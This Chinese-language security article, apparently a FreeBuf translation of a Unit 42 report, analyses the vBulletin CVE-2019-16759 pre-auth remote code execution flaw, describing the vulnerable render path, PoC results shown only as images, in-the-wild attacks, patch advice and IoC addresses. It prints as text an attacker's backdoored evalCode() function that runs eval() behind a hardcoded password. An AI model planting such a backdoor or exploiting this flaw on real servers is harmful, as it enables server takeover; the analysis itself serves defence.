@@ -1,0 +1,177 @@
+![](https://image.3001.net/images/20191103/1572711094_5dbdaab64f7c3.png!small)
+
+## 写在前面的话
+
+ **近期，vBulletin披露了一个最新的0 day漏洞细节，这个漏洞分配的CVE编号为CVE-2019-16759。与此同时，Unit
+42的安全研究人员也在网上发现了有很多攻击者正在利用该漏洞来实施攻击。在该漏洞的帮助下，未经身份验证的攻击者将能够访问和控制运行了v5.0.0至v5.5.4版本vBulletin的服务器，并且阻止网络管理员访问这些服务器。目前，使用了vBulletin的网站数量大约有10万多个，其中包括很多大型企业、组织和论坛，因此该漏洞应当立刻被修复。**
+
+在这篇文章中，我们会对这个漏洞的成因进行分析，并给出PoC演示代码以及其他关于该漏洞的详细信息。
+
+## 漏洞成因分析
+
+CVE-2019-16759是一个预认证远程代码执行漏洞，它的CVSS评分为9.8。vBulletin v
+5.0.0版本中引入的一个Ajax渲染函数，而这个函数将引发PHP服务器端模板注入，并最终导致这个预认证远程代码执行漏洞出现。
+
+首先，我们看一看index.php的代码：
+
+![](https://image.3001.net/images/20191103/1572711102_5dbdaabe691e6.png!small)
+
+这段代码会调用vB5_Frontend_ApplicationLight::isQuickRoute()来判断请求是否为“quick
+route”，使用的方法是位于includes/vb5/frontend/applicationlight.php中的isQuickRoute()：
+
+![](https://image.3001.net/images/20191103/1572711106_5dbdaac2c759b.png!small)
+
+在上图中，如果请求以“
+ajax/api”或“ajax/render”开头，那么函数将会返回true，vB5_Frontend_ApplicationLight对象会被初始化。
+
+![](https://image.3001.net/images/20191103/1572711115_5dbdaacb38d00.png!small)
+
+当接收到的请求以“ajax/render”开头，那么上图显示的处理器将会被设置为“callRender”：
+
+![](https://image.3001.net/images/20191103/1572711119_5dbdaacf19bf5.png!small)
+
+上图中的callRender()函数将会使用来自array_merge($_POST,
+$GET)的$routeInfo[2]和$params中的参数来进行模板渲染：
+
+![](https://image.3001.net/images/20191103/1572711122_5dbdaad2aa754.png!small)
+
+根据上图的内容，vbulletin-style.xml文件中有一个widget_php模板，如果模板中的$widgetConfig[‘code’]不为空，并且$vboptions[‘disable_php_rendering’]也被禁用了的话，就会执行下列代码：
+
+    
+    
+    {vb:action evaledPHP, bbcode, evalCode, {vb:raw 
+    
+    widgetConfig.code}}
+    
+                   {vb:raw $evaledPHP}
+
+![](https://image.3001.net/images/20191103/1572711131_5dbdaadbadd6f.png!small)
+
+上图显示的是evalCode()函数的代码，$code中的命令会直接由PHPeval()函数执行。使用params参数构造的请求如下：
+
+![](https://image.3001.net/images/20191103/1572711136_5dbdaae0935e4.png!small)
+
+## 漏洞概念验证PoC
+
+由于参数routestring来自$_REQUEST，因此它可以通过$_GET、$_POST和$_COOKIE
+HTTP等方法来发送，而widgetConfig[code]可以通过$_GET或$_POST方法发送，因此我们构建了下列请求：
+
+![](https://image.3001.net/images/20191103/1572711143_5dbdaae71e731.png!small)
+
+![](https://image.3001.net/images/20191103/1572711147_5dbdaaeb6f282.jpeg!small)
+
+上图显示的是PoC代码通过GET请求发送后phpinfo()函数运行的结果。
+
+下图显示的是PoC代码通过POST请求发送后phpinfo()函数运行的结果：
+
+![](https://image.3001.net/images/20191103/1572711153_5dbdaaf17e93c.png!small)
+
+## 漏洞在野利用情况分析
+
+目前，研究人员已经检测到了多个该漏洞的在野利用实例了。如下图所示，攻击者尝试执行了“die(@md5(HellovBulletin))”命令来判断目标服务器是否存在这个漏洞，但由于请求中多了一个等号“=”，所以漏洞利用失败了：
+
+![](https://image.3001.net/images/20191103/1572711161_5dbdaaf919561.png!small)
+
+下图显示的是攻击者尝试在目标服务器的Web根目录中创建一个名为“webconfig.txt.php”的文件：
+
+![](https://image.3001.net/images/20191103/1572711165_5dbdaafd50cb1.png!small)
+
+下图显示的是webconfig.txt.php的内容以及一个one-line PHP
+webshell，它们将允许攻击者向目标主机发送任意命令并实现命令的执行：
+
+![](https://image.3001.net/images/20191103/1572711169_5dbdab018f7d0.png!small)
+
+下图显示的是第三个在野漏洞利用例子，这里的攻击者尝试了覆盖bbcode.php文件：
+
+![](https://image.3001.net/images/20191103/1572711175_5dbdab07527f2.png!small)
+
+一旦利用成功，evalCode()函数将会变成下面这个样子：
+
+    
+    
+    function evalCode($code)
+    
+    {
+    
+    ob_start();if (isset($_REQUEST["epass"]) && $_REQUEST["epass"] == "2dmfrb28nu3c6s9j") { eval($code);}
+    
+    $output = ob_get_contents();
+    
+    ob_end_clean();
+    
+    return $output;
+    
+    }
+
+通过以上内容，当“epass”通过请求中的值 “2dmfrb28nu3c6s9j”来发送时，目标主机将会执行evalCode()函数的代码。
+
+## 漏洞修复
+
+研究人员建议广大网络管理员尽快将vBulletin更新到[ _v5.5.2/3/4 Patch Level
+1_](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4422707-vbulletin-security-patch-released-versions-5-5-2-5-5-3-and-5-5-4)。
+
+## 入侵威胁指标IoC
+
+> 132[.]232[.]236[.]207
+>
+> 69[.]160[.]169[.]100
+>
+> 154[.]221[.]17[.]40
+>
+> 103[.]45[.]105[.]234
+>
+> 150[.]109[.]116[.]145
+>
+> 117[.]50[.]67[.]41
+>
+> 218[.]207[.]20[.]109
+>
+> 112[.]213[.]103[.]96
+>
+> 106[.]54[.]225[.]43
+>
+> 103[.]120[.]83[.]11
+>
+> 193[.]8[.]80[.]129
+>
+> 192[.]186[.]2[.]205
+>
+> 175[.]126[.]145[.]10
+>
+> 144[.]202[.]100[.]24
+>
+> 154[.]223[.]154[.]103
+>
+> 122[.]152[.]215[.]43
+>
+> 103[.]103[.]68[.]99
+>
+> 45[.]249[.]181[.]8
+>
+> 180[.]76[.]234[.]185
+>
+> 106[.]12[.]205[.]15
+>
+> 216[.]83[.]52[.]60
+>
+> 49[.]234[.]48[.]107
+>
+> 193[.]112[.]203[.]71
+>
+> 132[.]232[.]220[.]67
+>
+> 185[.]23[.]201[.]31
+>
+> 103[.]68[.]173[.]13
+>
+> 156[.]224[.]8[.]52
+>
+> 103[.]250[.]6[.]215
+>
+> 117[.]78[.]35[.]14
+>
+> 106[.]13[.]82[.]38
+
+ *** 参考来源：[ _paloaltonetworks_](https://unit42.paloaltonetworks.com/exploits-in-the-wild-for-vbulletin-pre-auth-rce-vulnerability-cve-2019-16759/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM  
+**
+
